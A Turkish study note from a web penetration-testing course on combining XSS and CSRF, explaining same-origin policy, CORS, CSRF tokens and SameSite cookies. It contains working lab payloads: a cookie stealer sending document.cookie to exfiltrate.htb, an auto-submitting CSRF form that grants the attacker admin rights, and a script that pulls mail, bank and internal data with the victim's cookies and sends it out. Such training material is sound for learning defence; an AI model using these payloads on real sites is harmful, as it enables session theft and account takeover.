---
{"dg-publish":true,"permalink":"/web-pentest-expert/advanced-xss-and-csrf-exploitation/","created":"2024-12-16T16:30:48.092+03:00","updated":"2025-06-04T01:20:53.598+03:00"}
---


Bu modülde tartışacağımız gibi, modern web tarayıcılarındaki birçok güvenlik politikası ve güvenlik önlemi, CSRF güvenlik açıklarının temel istismarını kısıtlar veya önler. Örneğin, ilerleyen bölümlerde daha ayrıntılı olarak inceleyeceğimiz `Same-Origin` politikası, Cross-Origin Resource Sharing (CORS) ve SameSite cookies gibi.

Bu nedenle, düz CSRF güvenlik açıklarının exploit'i gerçek dünyada giderek daha nadir hale gelmiştir. Bununla birlikte, bir XSS açığı keşfedersek, XSS ve CSRF'nin istismarını birleştirebiliriz, bu da savunmasız web uygulamasının kendisine ve potansiyel olarak kurbanın iç ağındaki ek web uygulamalarına saldırmamızı sağlayan güçlü bir araçla sonuçlanır

CSRF ve XSS açıklarından faydalanmak ve savunmasız web uygulamasıyla etkileşime geçmek için [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object'ine veya daha modern [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)'sini kullanabiliriz. Yöntem, HTTP header'larını veya request body gibi HTTP parametrelerini belirtirken JavaScript kodundan HTTP istekleri yapmak için her ikisini de kullanabiliriz.

Örneğin, `xhr.open` call'ında URL'yi belirterek, `xhr.setRequestHeader` fonksiyonunu kullanarak HTTP header'larını ayarlayarak ve `xhr.send` call'ında request body parametrelerini belirterek `XMLHttpRequest` object'ini kullanarak bir POST request'i gönderebiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://exfiltrate.htb/', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=hello&param2=world');
```

Öte yandan, aynı isteği `Fetch API` kullanarak şu şekilde gönderebiliriz:

```js
const response = await fetch('http://exfiltrate.htb/', {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=hello&param2=world',
  });
```

`fetch` fonksiyonu ilk parametrede URL'yi bekler. Tüm ek request parametrelerini ikinci parametrede bir object içinde aktarabiliriz.

Not: Whitebox sızma testi sürecinde olduğu gibi, XSS ve CSRF exploitlerimizi kurbanlara göndermeden önce lokal olarak debug etmek ve test etmek çok önemlidir; bu, angajmanlar sırasında dos gibi istenmeyen davranışlara yol açabilecek hatalardan kaçınmamızı sağlar.


### Laboratuvar Ortamına Giriş

Bu modülde, tüm laboratuvarlar aynı genel yapıyı takip edecek ve exploitimizi geliştirmek, ince ayar yapmak ve sunmak için kullanabileceğimiz birden fazla virtual hosts içerecektir. Bu bölümde, elimizdeki farklı araçları ve bunları ilerleyen bölümlerde karşılaşacağımız farklı CSRF ve XSS güvenlik açıklarından yararlanmak için nasıl kullanabileceğimizi tartışacağız.

Genel olarak, laboratuvarlar aşağıdaki bileşenlerden oluşur:

* `exfiltrate.htb` adresinde bir sızma sunucusu
* `exploitserver.htb` adresinde bir exploit geliştirme sunucusu
* `vulnerablesite.htb` adresinde değerlendirdiğimiz güvenlik açığı olan web uygulaması


### Exfiltration Server (Sızma Sunucusu)

`Exfiltrate.htb` adresindeki exfiltration sunucusu veri sızdırmak için kullanılabilir. Bu nedenle, exfiltration sunucusu `GET` parametreleri, `POST` parametreleri ve `HTTP` header'ları dahil olmak üzere kendisine yapılan tüm requestlerin tüm request parametrelerini loglar. Loglanan verilere `/log` endpoint adresinden erişilebilir.

Örneğin, `param1` ve `param2` parametreleri aracılığıyla veri sızdırdığımızı varsayarak aşağıdaki HTTP isteğini yapabiliriz:

```shell-session
[!bash!]$ curl -X POST --data 'param1=Hello' http://exfiltrate.htb?param2=World
```

Daha sonra, sızan verileri görüntülemek için logu alabiliriz:

```shell-session

-----
/?param2=World
Host: exfiltrate.htb
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 172.17.0.1
X-Forwarded-Host: exfiltrate.htb
X-Forwarded-Server: exfiltrate.htb
Content-Length: 12
Connection: Keep-Alive


param1=Hello
```


Log'a bir web tarayıcısından da erişebiliriz:

![Pasted image 20250601223450.png](/img/user/resimler/Pasted%20image%2020250601223450.png)


### Exploit Development Server

`exploitserver.htb` adresindeki exploit geliştirme sunucusunu kullanarak bir CSRF veya XSS payload'u geliştirebilir ve bu exploit'i kurbanımıza gönderebiliriz.

Exploit geliştirme sunucusu, hedef web uygulamalarında bulduğumuz belirli güvenlik açıklarını hedeflemek için özel bir exploit geliştirmemizi sağlar. Hedef web uygulamasında bir XSS poc için bir alert kutusunu tetiklemek istediğimizi varsayalım:

![Pasted image 20250601223606.png](/img/user/resimler/Pasted%20image%2020250601223606.png)

Geliştirdiğimiz exploit'i `/exploit` endpoint'ine erişerek görüntüleyebiliriz. Bunu yapmak alert açılır penceresini tetikler:

![Pasted image 20250601223621.png](/img/user/resimler/Pasted%20image%2020250601223621.png)

Son olarak, `/deliver` endpoint'e erişerek kurbanımıza exploit'i teslim edebiliriz, bu da kurbanın `http://exploitserver.htb/exploit` adresini ziyaret ederek geliştirdiğimiz payload'u tetiklemesine neden olacaktır. Bu, exploit kodunu tetiklemek için kurbanın gönüllü olarak payload'a erişmesi gereken CSRF saldırılarında faydalıdır. Bu modül, exploit teslim yöntemlerine değil, exploit geliştirmeye odaklanmaktadır. Payload'u kurbana teslim etmek exploit'i tetiklemeye zorlar; gerçek dünyada, kurbana e-posta veya herhangi bir mesajlaşma servisi aracılığıyla bir bağlantı göndermek de dahil olmak üzere çok sayıda exploit teslim yöntemi mevcuttur.

Bir XSS payload'u geliştirmek için exploit sunucusunu da kullanabiliriz. Ancak, bu gibi durumlarda exploit'i kurbana iletmemize gerek yoktur, çünkü payload savunmasız siteye enjekte edilen XSS payload'u tarafından iletilecektir.


# Lab Warmup

Laboratuvar bileşenlerini tartıştıktan sonra, birkaç örnek güvenlik açığını exploit etmek için bunları nasıl kullanabileceğimizi keşfedelim.


### XSS Warm-Up

Örnek web uygulamamız, tüm kullanıcıların görüntüleyebileceği entryler bırakmamıza izin veren basit bir ziyaretçi defteridir. Bir admin, spam'i ele almak için girdileri sık sık izler:

`http://xss.vulnerablesite.htb/view.php`

![Pasted image 20250601223846.png](/img/user/resimler/Pasted%20image%2020250601223846.png)

Aşağıdaki input'u yayınlayarak bariz bir XSS güvenlik açığını doğrulayabiliriz:

```html
<script>alert(1)</script>
```

![Pasted image 20250601223909.png](/img/user/resimler/Pasted%20image%2020250601223909.png)

Admin kullanıcının cookie'lerini çalmak için bir exploit geliştirelim. Exploit sunucusundan script yükleyen bir payload kullanarak exploitserver'ı exploit geliştirme için kullanabiliriz:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Daha sonra, exploit sunucusunda aşağıdaki gibi bir cookie stealer payload oluşturabiliriz. Cookie'yi exfiltrate etmek için exfiltration sunucusunu kullanabiliriz:

```js
window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;
```

Exploit'i kaydettikten sonra, `/exploit` endpoint'ine erişerek kaydedildiğini onaylayabiliriz:

![Pasted image 20250601224021.png](/img/user/resimler/Pasted%20image%2020250601224021.png)

Son olarak, admin kullanıcının ziyaretçi defterine erişmesini beklemeliyiz. Enjekte edilen XSS payload'u adminin tarayıcısının payload'u exploit sunucusundan yüklemesine neden olur, bu da admin kullanıcının cookie'lerini exfiltration sunucusuna sızdırır. Sızma sunucusunun loguna `/log` endpoint adresinden erişildiğinde sızan cookie'ler ortaya çıkar:

![Pasted image 20250601224226.png](/img/user/resimler/Pasted%20image%2020250601224226.png)


### CSRF Warm-Up

Örnek web uygulaması henüz yapım aşamasında olduğu için fazla fonksiyon içermemektedir:

`http://csrf.vulnerablesite.htb/index.php`

![Pasted image 20241216192241.png](/img/user/resimler/Pasted%20image%2020241216192241.png)

Ancak, yalnızca kullanıcı yetkilerimiz olduğunu görebiliyoruz. Bir "yükselt (promote)" butonu var. Buna bastığımızda, web uygulaması bize yalnızca admin kullanıcıların diğer kullanıcıları yükseltebileceğini bildiriyor. Ancak, yükseltme işleminin aşağıdaki istekle gerçekleştirildiğini görebiliyoruz:

![Pasted image 20250601224322.png](/img/user/resimler/Pasted%20image%2020250601224322.png)

Özellikle, bu end point'te CSRF koruması bulunmamaktadır, bu da bir admin'e kullanıcı hesabımızı yükseltmek için bir CSRF saldırısı gerçekleştirmemize olanak tanır. Bunu yapmak için, yükseltme isteğine karşılık gelen bir HTML formu oluşturmamız gerekir:

```html
<html>
  <body>
    <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Saldırının ek bir kullanıcı etkileşimi gerektirmesini istemediğimiz için, sayfa yüklendiğinde formu otomatik olarak gönderen JavaScript kodu ekleyeceğiz:

```html
<script>
	document.forms[0].submit();
</script>
```

Bu iki parçayı birleştirdiğimizde, `exploitserver.htb` adresindeki exploitserver'a kaydedeceğimiz aşağıdaki payload ortaya çıkar:

```html
<html>
  <body>
    <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Güvenlik açığı olan uygulamada oturum açmışken `View Exploit`'e tıklayarak exploit'imizi test edebiliriz. Bu, kaydedilmiş payload'umuzu döndüren `http://exploitserver.htb/exploit` adresine bir istekle sonuçlanır. Payload, formu otomatik olarak göndererek güvenlik açığı bulunan web uygulamasına cross-origin request oluşturur. Ancak, administrator olmadığımız için yükseltme başarısız olur:

`http://csrf.vulnerablesite.htb/profile.php?promote=htb-stdnt`

![Pasted image 20250601224957.png](/img/user/resimler/Pasted%20image%2020250601224957.png)

Ancak bu, CSRF payload'umuzun kullanıcımızı yükseltmek için HTTP isteğini başarıyla gönderdiğini doğrular. Saldırıyı gerçekleştirmek için, payload'umuzu kurbana gönderebiliriz. Bu, kurbanın `http://exploitserver.htb/exploit` adresine erişmesiyle sonuçlanacaktır. Birkaç saniye bekledikten ve sayfayı yeniledikten sonra admin konumuna terfi ederiz:

![Pasted image 20241216192837.png](/img/user/resimler/Pasted%20image%2020241216192837.png)

Böylece, CSRF güvenlik açığından başarılı bir şekilde yararlanarak adminin kullanıcımızı yükseltmesini sağladık.

Not: Laboratuvarlar üzerinde çalışırken lütfen aşağıdaki hususları aklınızda bulundurun:

* Bu modüldeki tüm laboratuvarlarda simüle edilmiş bir kurban kullanıcı bulunmaktadır. Bu kurban kullanıcının payload'a erişmesi biraz zaman alabilir. Bu nedenle, payload'unuzun çalıştığından emin olmak için öncelikle kendiniz test edin ve kurbanın exploiti tetiklemesi için birkaç dakika sabırlı bir şekilde bekleyin.

* Simüle edilen kurban, **Chromium 114.0.5735.90** sürümünü kullanmaktadır. Exploitler bu tarayıcı sürümünde test edilmiştir. Üçüncü taraf cookielerin işlenmesiyle ilgili son değişiklikler nedeniyle, exploitlerin daha yeni tarayıcı sürümlerinde çalışacağı garanti edilemez. Daha eski Chromium sürümlerini [buradan](https://mirror.cs.uchicago.edu/google-chrome/pool/main/g/google-chrome-stable/) indirebilirsiniz.

* Bir laboratuvardan diğerine geçerken lütfen tüm cookieleri silin. Önceki laboratuvarlardan kalan cookieler, tarayıcının gelecekteki laboratuvarlarda cookieleri reddetmesine neden olabilir.



# Introduction to CSRF Exploitation

CSRF güvenlik açıklarının istismarını ayrıntılı olarak tartışmadan önce, CSRF'nin temellerini ve yaygın CSRF savunmalarını hızlıca özetleyeceğiz. 

## Recap: Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF), bir saldırganın payload'unun, kurbanın tarayıcısını, kimlik doğrulamasının yapıldığı savunmasız bir web uygulamasında istemeden eylemler gerçekleştirmeye zorladığı bir web saldırısı türüdür. CSRF saldırıları genellikle saldırgan tarafından kontrol edilen bir web sitesindeki bir payload tarafından gerçekleştirilir ve bu payload savunmasız web uygulamasına cross-origin requestleri gönderir. Bu nedenle, saldırı genellikle kurbanın saldırganın kontrolündeki web sitesine gönüllü olarak veya sosyal mühendislik gibi diğer saldırı vektörleri aracılığıyla erişmesini gerektirir. Başarılı bir CSRF saldırısında, cross origin request'i kurbanın session cookie'leri ile gönderilir ve savunmasız web uygulamasında bir değişiklik gerçekleştirir.

Örnek olarak, aşağıdaki senaryoyu ele alalım. Kurban, `http://vulnerablesite.htb`sitesinin bir yöneticisidir ve siteye giriş yapmıştır, yani tarayıcıda geçerli bir session cookie'si bulunmaktadır. Site, CSRF saldırılarına karşı korumalı değildir. Saldırgan, savunmasız web uygulamasında düşük ayrıcalıklı bir hesaba sahiptir ve admin yetkilerini elde etmek için bir CSRF saldırısı gerçekleştirmek istemektedir. Kurban, saldırganın kontrol ettiği **`http://exploitserver.htb`** sitesine eriştiğinde, bu site, kurbanın tarayıcısında JavaScript kodu çalıştırarak **`http://vulnerablesite.htb/promote?user=attacker`** adresine cross-origin bir request gönderir.

Tarayıcı, kurbanın session cookie'lerini bu cross-origin request'iyle birlikte gönderir, böylece request kimlik doğrulanır. Bu nedenle, web uygulaması saldırganın kullanıcı hesabını admin seviyesine yükseltir ve saldırgan, CSRF saldırısını başarılı bir şekilde gerçekleştirerek web uygulamasında admin yetkileri elde eder.

Bu modülde CSRF payload'larını manuel olarak oluşturacak olsak da, otomatik payload oluşturma için kullanabileceğimiz araçlar vardır, örneğin buradaki [CSRF PoC](https://csrf-poc-generator.vercel.app/) oluşturucu.


### Recap: CSRF Defenses

CSRF saldırılarına karşı koruma sağlamak için birçok farklı savunma mekanizması vardır ve bunların çoğu Same-Origin policy'inin getirdiği kısıtlamalara dayanır. CSRF koruması için farklı seçenekleri kısaca özetleyeceğiz.


### CSRF Tokens

CSRF Token'ları, örneğin HTML formları gönderilirken web uygulamasında hassas değişiklikler yapan requestleri dahil edilmesi gereken benzersiz ve rastgele değerlerdir. Token tahmin edilemez olmalıdır, böylece bir saldırgan değerini önceden bilemez. Ayrıca, web uygulamasının hassas değişikliği gerçekleştirmeden önce CSRF token'ının değerini kontrol etmesi gerekir. Bu, saldırganın web uygulamasının kabul ettiği bir cross-site isteği oluşturmasını engeller. Token tahmin edilemez olmalı, backend tarafından yeterince kontrol edilmeli ve bir cookie içinde gönderilmemelidir, aksi takdirde CSRF token koruması etkisiz olabilir.

Yukarıdaki örneğimizde, web uygulaması yalnızca user GET parametresinde kullanıcı adını ve `csrf_token` GET parametresinde CSRF token'ını (genellikle HTML formunda gizli bir değer) içeren kullanıcı yükseltme isteklerini kabul edecektir. CSRF token rastgele bir değer olduğundan, saldırgan doğru değeri bilemez ve bu nedenle, yalnızca geçersiz bir CSRF token ile  cross-origin request oluşturabilir. Web uygulaması CSRF token'ını doğru bir şekilde kontrol ederse, request reddedilir, böylece saldırgan kullanıcı hesabı admin ayrıcalıklarına yükseltilmemiş olur.


### HTTP Headers

CSRF token'larına alternatif olarak web uygulamaları CSRF saldırılarından korunmak için HTTP header'larını kullanabilir. Örneğin, bir web uygulaması [Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) veya [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header'larını kontrol ederek Cross-origin requestlerini engelleyebilir ve böylece CSRF saldırılarını önleyebilir.

Web tarayıcıları, request'in geldiği hedef kaynağı belirtmek için genellikle `Origin` header'ını cross origin isteklerine ekler. Bir saldırgan bu davranışı kontrol edemez. Bu nedenle bir web uygulaması, bir isteğin başka bir kaynaktan gelip gelmediğini belirlemek için Origin header'ının değerini kontrol edebilir ve ardından CSRF saldırılarını önlemek için durum değiştiren cross origin isteklerini engelleyebilir.

Aynı metodoloji, bir kaynağın hangi URL'den talep edildiğini belirtmek için genellikle web tarayıcıları tarafından eklenen Referer header'ına da uygulanabilir.


### SameSite Cookies

Bir başka CSRF koruma mekanizması da `SameSite` cookie attribute'udur (ilk olarak bu [İnternet Taslağında](https://datatracker.ietf.org/doc/html/draft-west-first-party-cookies-07) hazırlanmış ve daha sonra başka bir[ İnternet Taslağında ](https://datatracker.ietf.org/doc/html/draft-west-cookie-incrementalism-01)güncellenmiştir). Bir web uygulaması, cookie'nin cross-origin istekleriyle birlikte gönderilip gönderilmeyeceğini yapılandırmak için bu attribute'u ayarlayabilir. Attribute aşağıdaki değerlere sahip olabilir:

* `none` : tarayıcı tarafından hiçbir ek önlem uygulanmaz. Cookie tüm cross-origin istekleri ile birlikte gönderilir

* `lax` : tarayıcı cookie'yi sadece bazı cross-origin istekleri ile gönderir. Örneğin, yalnızca GET kullanılarak yapılan crossorigin form gönderimleri. Cookie, JavaScript'ten yapılan herhangi bir cross-origin isteği ile gönderilmez

* `strict` : tarayıcı cookie'yi herhangi bir cross-origin isteği ile göndermez

Çoğu modern tarayıcı, varsayılan olarak (yani, SameSite cookie attribute'u açıkça ayarlanmamışsa) SameSite attribute'unu `Lax` olarak zorlar. Tarayıcı yalnızca güvenli HTTP istekleriyle cookie gönderdiğinden ve bu da POST tabanlı CSRF saldırılarını önlediğinden, bu varsayılan olarak birçok CSRF saldırısını önler. GET tabanlı CSRF saldırıları hala mümkündür ancak POST tabanlı CSRF saldırılarına göre önemli ölçüde daha az yaygındır

Genel olarak, web uygulamalarının birincil CSRF savunması olarak CSRF token'larını kullanmaları önerilir. SameSite cookies ve header tabanlı kontroller de ek derinlemesine savunma önlemleri olarak kullanılabilir.


# Same-Origin Policy & CORS

CSRF saldırılarına karşı savunmaları ve bunların nasıl atlatılacağını tam olarak anlamak için öncelikle [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) ve [Cross-Origin Resource Sharing (CORS) ](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)konularını tartışmamız gerekir.



### What is the Same-Origin Policy?

Same-Origin politikası, web sitelerine cross origin erişimi önlemek için web tarayıcılarında uygulanan bir güvenlik mekanizmasıdır. Özellikle, bir kaynakta çalışan JavaScript kodu farklı bir kaynağa erişemez. Bu, kötü niyetli bir sitenin diğer originden bilgi sızdırmasını önler ve diğer originlere yapabileceği request türlerini kısıtlar.

`Origin` (kavram hakkında daha fazla bilgi için [RFC 6454](https://datatracker.ietf.org/doc/html/rfc6454)'e bakın) bir URL'nin scheme, host ve port'u olarak tanımlanır. Same-Origin politikası, iki URL bu üç özellikten en az birinde farklılık gösterdiğinde uygulanır. Örneğin, bir `http` sitesi ve bir `https` sitesi, scheme'daki farklılık nedeniyle farklı originlere sahiptir. Ayrıca, `https://academy.hackthebox.com` ve `https://hackthebox.com` da host farklılığı nedeniyle farklı originlere sahiptir. Öte yandan, `https://hackthebox.com` ve `https://hackthebox.com:443` `schema`, `host` ve `port` eşleştiği için aynı origini paylaşmaktadır (https'nin varsayılan portu 443'tür).

Web tarayıcılarının Same-Origin politikasını uyguladığı göz önüne alındığında, yazılımlarındaki güvenlik açıkları ve hatalar bypasslara yol açarak potansiyel olarak yüksek önemde güvenlik açıklarına neden olabilir

[[Bağlantılar/Chatgpt origin acıklama\|Chatgpt origin acıklama]]

### Same-Origin Policy olmadan

Same-Origin politikasının web güvenliği için neden çok önemli olduğunu anlamak için, bunun olmadığı bir senaryo hayal edelim.

Ev ağımızdaki özel dizüstü bilgisayarımızda `https://exploitationserver.htb` kötü amaçlı web sitesini ziyaret ettikten sonra aşağıdaki JavaScript kodunu çalıştırdığını varsayalım:

```html
<script>
    async function exfiltrate_data(url) {
        // get data
        const response = await fetch(url, {credentials: "include"});
        const data = await response.text();

        // exfiltrate data
        await fetch("https://exfiltrate.htb/exfiltrate?c=" + btoa(data));
    }

    // exfiltrate mails
    exfiltrate_data("https://mymails.htb/getmails");

    // exfiltrate bank data
    exfiltrate_data("https://mybank.htb/myaccounts");

    // exfiltrate internal service
    exfiltrate_data("https://192.168.178.5/");
</script>
```

`https://exploitationserver.htb` adresindeki JavaScript kodu, tarayıcımızdan `https://mymails.htb/getmails` , `https://mybank.htb/myaccounts` ve `https://192.168.178.5/` adreslerine üç adet fetch isteği yapar. Bu sitelerden herhangi birinde oturum açtıysak, SameSite cookie yapılandırmasına bağlı olarak tarayıcımız bu isteklerle birlikte session cookie'lerimizi de gönderecektir. Bu, bu isteklerin kimliğinin doğrulanmasını sağlar. JavaScript kodu daha sonra yanıtı `https://exfiltrate.htb/exfiltrate` adresine geri göndererek dışarı sızdırır. Bu şekilde, `https://exfiltrate.htb` adresini çalıştıran saldırgan, kullanıcı hesabımızdan gelen üç doğrulanmış GET isteğinin response'unu elde eder ve saldırganın `https://mymails.htb` adresindeki e-postalarımıza, `https://mybank.htb` adresindeki banka bilgilerimize ve hesap bakiyemize ve hatta `https://192.168.178.5` adresindeki ev iç ağımızda çalışan wiki'mize (public olmayan ancak yalnızca local ağdan erişilebilen) erişmesini sağlar.

Bu önemli bir güvenlik ihlalidir ve bunun olmasını önlemek için hiçbir şey yapamayız. Same-Origin politikası özellikle bu sorunu hafifletmek için tasarlanmıştır.

### Same-Origin Policy ile

Yukarıda tartışıldığı gibi, Same-Origin politikası originler arasında erişimi engeller. Yukarıdaki durumda, `https://exploitationserver.htb`'un origini, farklı host nedeniyle kötü niyetli web sitesi tarafından saldırılan üç originden de farklıdır. Bu nedenle, farklı bir origine getirme çağrısı, tarayıcıda Same-Origin politikasının neden olduğu bir hataya neden olur ve `https://exploitationserver.htb` verilere erişemez ve verileri sızdıramaz:

![Pasted image 20241216202058.png](/img/user/resimler/Pasted%20image%2020241216202058.png)

Same-Origin politikasının `https://exploitationserver.htb`'un yalnızca cross-origin request'in response'una erişmesini engellediğini anlamak çok önemlidir. (Potansiyel olarak kimliği doğrulanmış) request'in kendisi hala gönderilmektedir. Bunu Burp ile doğrulayabiliriz. Bunun gerçekten de cross-origin bir request olduğunu gösteren `Origin` ve `Referer` header'larına dikkat edin:

![Pasted image 20241216202346.png](/img/user/resimler/Pasted%20image%2020241216202346.png)

Bu davranış, request geri çekilmediği için CSRF saldırılarına yol açabilir.

Same-Origin Policy'nin bazı istisnaları vardır. Örneğin, `img`, `video` ve `script` gibi taglarla farklı kaynaklardan (cross-origin) gelen içerikleri dahil edebiliriz. Örneğin, farklı bir kaynaktan yüklense bile, sahip olduğumuz bir web sitesine Hack The Box Academy'nin logosunu aşağıdaki HTML kodunu kullanarak ekleyebiliriz:

```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            var img = document.createElement("img");
            img.setAttribute("src", "https://academy.hackthebox.com/images/logo.svg");
            document.body.appendChild(img);
        </script>
    </body>
</html>
```


### What is CORS?

Cross-Origin Resource Sharing (CORS), Same-Origin politikasındaki istisnaları tanımlamak için bir W3C standardıdır. Bu, bir origin'in güvenilir originlerin bir listesini ve originler arasında izin verilecek HTTP yöntemlerini tanımlamasını sağlar.


#### CORS'a neden ihtiyacımız var?

CORS'a neden ihtiyaç duyduğumuzu anlamak için, gerçek dünyada yaygın olan aşağıdaki senaryoyu varsayalım: `http://vulnerablesite.htb` adresinde barındırılan bir web uygulaması verileri görüntüler. Bunu yapmak için, `http://api.vulnerablesite.htb` adresinde barındırılan bir API ile konuşur. Daha spesifik olarak, `http://vulnerablesite.htb` üzerinde çalışan uygulama yalnızca API'den veri alan front-end kodundan oluşmaktadır. API, veri oluşturmak, okumak, güncellemek ve silmek için endpoint'lerden oluşan basit bir REST API uygular.

Bu, verilerle ilgili herhangi bir mantığı işlemesi gerekmeyen basit bir front-end web uygulamasına izin verir. Özellikle, front-end kodu API ile etkileşimi yönetir, bunun için aşağıdakine benzer JavaScript kodu kullanabilir, böylece site yüklendikten sonra tüm veriler getirilir:

```javascript
// fetch data
fetch("http://api.vulnerablesite.htb/data", {
	method: "GET"
}).then((response) => {
	return response.json();
}).then((data) => {
	// add to DOM
	<SNIP>
})
```

Ancak, yukarıda tartışıldığı gibi, `http://vulnerablesite.htb` ve `http://api.vulnerablesite.htb` farklı originler olduğundan, bu durum `Same-Origin` politikasını ihlal etmektedir. Bu nedenle, yukarıdaki JavaScript kodu bir hataya neden olur ve veriler düzgün yüklenmez:

![Pasted image 20241216204811.png](/img/user/resimler/Pasted%20image%2020241216204811.png)

Şimdi CORS'un nasıl çalıştığını ve bir web uygulamasının bir API ile Same-Origin politikasının neden olduğu hatalar olmadan konuşmak için neler yapabileceğini tartışalım


### CORS nasıl çalışır?

Bir web sunucusu, HTTP response'unda aşağıdaki CORS headerlarından herhangi birini ayarlayarak Same-Origin politikasına istisnalar tanımlayabilir (`preflight requestlerini` konusunu daha sonra ele alacağız):

- **[Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin):** Belirli bir origin için Same-Origin politikasına istisnalar tanımlar.
- **[Access-Control-Expose-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers):** Belirli HTTP headerları için Same-Origin politikasına istisnalar tanımlar.
- **[Access-Control-Allow-Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods):** Preflight request'ine response olarak izin verilen HTTP methodları için Same-Origin politikasına istisnalar tanımlar.
- **[Access-Control-Allow-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers):** Preflight request'ine response olarak izin verilen HTTP headerları için Same-Origin politikasına istisnalar tanımlar.
- **[Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials):** `true` olarak ayarlandığında, cookies veya Authorization header gibi kimlik doğrulama bilgileri içeren cross-origin requestlere rağmen Same-Origin politikasına istisnalar tanımlar.
- **[Access-Control-Max-Age](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age):** Diğer CORS headerlarında yer alan bilgilerin, yeni bir preflight request'i gönderilmeden ne kadar süreyle cache'de tutulabileceğini tanımlar.

En basit CORS yapılandırması, herhangi bir script dosyası kodu olmadan düz HTML'den yapılabilen `simple request` olarak adlandırılan yapılandırmadır. Simple request'ler, herhangi bir özel HTTP header'ı olmadan `GET` veya `HEAD` requestleri olabileceği gibi, herhangi bir özel HTTP header'ı ve `application/x-wwwform-urlencoded` , `multipart/form-data` veya `text/plain` `Content-Type`'ı olmayan POST requestleri de olabilir.

Örneğimizde, veri alma işlemi **`http://api.vulnerablesite.htb/data`** adresine yapılan bir `GET` isteği ile gerçekleştirilmiştir. Bu, yukarıdaki koşulları karşıladığı için basit bir istektir. Bu nedenle, API'nin yalnızca istek yapan origin için bir istisna tanımlaması ve tüm API yanıtlarında **`Access-Control-Allow-Origin`** headerını ayarlaması gerekir.

Daha sonra, `http://vulnerablesite.htb` adresindeki web uygulaması cross-origin isteğinden gelen response'u okuyabilir. İşte Cross-origin request'i ve Burp'teki response:

![Pasted image 20241216212731.png](/img/user/resimler/Pasted%20image%2020241216212731.png)


### Preflight Requests

Simple requestler koşullarına uymayan tüm istekler, **`preflighted requests`** olarak adlandırılır. Tarayıcı, bu tür cross-origin requestleri göndermeden önce, farklı bir origine **`preflight request`** gönderir ve bu request, gerçek cross-origin request'inin tüm parametrelerini içerir. Bu, web sunucusunun cross-origin isteğe izin verip vermeyeceğine karar vermesini sağlar.

Tarayıcı, preflight request'ine gelen response'u bekler ve yalnızca web sunucusu, preflight request'ine response olarak uygun **CORS headers** ayarlayarak izin verirse gerçek cross-origin request'i göndermeye devam eder. Tarayıcı, gerçek cross-origin request'ini göndermeden önce web sunucusundan izin istediği için, **preflighted requests** ile CSRF açıkları mümkün değildir.

preflight request aşağıdaki header'ları içeren bir `OPTIONS` isteğidir:

* [Access-Control-Request-Method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method): server'a gerçek request'de kullanılan HTTP methodu hakkında bilgilendirir
* [Access-Control-Request-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers): server'a gerçek request'de kullanılan HTTP headerları hakkında bilgi verir

Örneğin, API'nin web uygulamasından gelen bir POST isteğinde JSON verilerini kabul etmesi gerekiyorsa, Content-Type basit bir istekte izin verilmeyen `application/json` olarak ayarlandığı için basit bir request yetersizdir. Bu nedenle, tarayıcı asıl isteği göndermeden önce bir preflight request gönderecektir. API'nin CORS response header'larını buna göre ayarlaması ve tarayıcıya cross-origin isteğine izin verdiğini söylemesi gerekir. Daha spesifik olarak, `http://vulnerablesite.htb` origin'inine, `POST` metoduna ve `Content-Type` header'ına izin vermelidir.

CORS header'ları doğru yapılandırıldığında, web uygulaması ve API, Same-Origin politikası sorunları olmadan birbirleriyle konuşabilir. Bir kullanıcının POST isteğiyle yeni bir data item oluşturmak istediğini varsayalım; kullanıcının tarayıcısı ilk olarak API'nin potansiyel olarak tehlikeli olan cross-origin isteğine izin verip vermediğini kontrol etmek için bir preflight request'i gönderecektir:

![Pasted image 20241216215403.png](/img/user/resimler/Pasted%20image%2020241216215403.png)

Response doğru CORS header'larını içerdiğinden, tarayıcı API'nin preflighted request'e izin verdiğini bilir; bu nedenle, request'i göndermeye devam eder:

![Pasted image 20241216215532.png](/img/user/resimler/Pasted%20image%2020241216215532.png)

Bu request aynı zamanda request originiyle birlikte bir CORS header içerdiğinden, tarayıcı Same-Origin politikası için bir istisna ekler, böylece web uygulaması response'a erişebilir ve işlemin sonucunu kontrol edebilir (bu durumda, `Success`).

Verileri güncellemek için bir `PUT` request'i ve verileri silmek için bir `DELETE` request'i etkinleştirmek için API, preflight request'in response'undaki `Access-Control-Allow-Methods` CORS header'ını izin verilen tüm methodları içerecek şekilde ayarlamalıdır.


# CORS Misconfigurations

